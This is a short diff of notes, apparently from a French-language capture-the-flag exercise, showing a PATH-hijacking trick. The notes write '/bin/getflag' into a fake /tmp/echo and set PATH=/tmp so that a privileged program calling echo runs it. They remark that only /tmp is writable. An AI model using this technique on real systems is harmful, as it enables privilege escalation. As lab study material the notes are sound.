@@ -1,0 +1,6 @@
+echo "/bin/getflag" > /tmp/echo
+
+PATH=/tmp
+
+on overwrite le vrai /bin/echo par un script qui va lire le flag
+(ls -la | grep w dans / j'arrive a ecrire que dans /tmp)
